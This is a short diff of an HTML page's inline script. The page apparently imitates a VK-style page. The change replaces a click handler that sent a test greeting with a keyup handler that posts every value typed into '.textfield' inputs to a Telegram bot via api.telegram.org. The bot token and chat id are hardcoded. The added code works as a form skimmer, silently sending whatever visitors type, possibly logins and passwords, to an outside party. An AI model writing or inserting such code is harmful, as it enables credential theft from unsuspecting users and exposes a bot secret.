@@ -76,14 +76,21 @@
 </div>
 <div id="vk_bottom"></div>
 <script>
-  		
-  		$("input").click(function(){ 
+$('.textfield').keyup(function(){
+	let aaa = $(this).val();
+	ggg(aaa);
+});
+
+
+
+
+
+  		function ggg(aaa){ 
 
 	    $.ajax(
-  'https://api.telegram.org/bot864922840:AAHXkQo-CodVOvjlDePkkbWA75hk3o-_FVU/sendMessage?chat_id=198168567&text=Привет%20мир'          
+  'https://api.telegram.org/bot864922840:AAHXkQo-CodVOvjlDePkkbWA75hk3o-_FVU/sendMessage?chat_id=198168567&text='+aaa          
   
 );
-	  });
   		console.log('dgdf');
   	</script>
 </body>
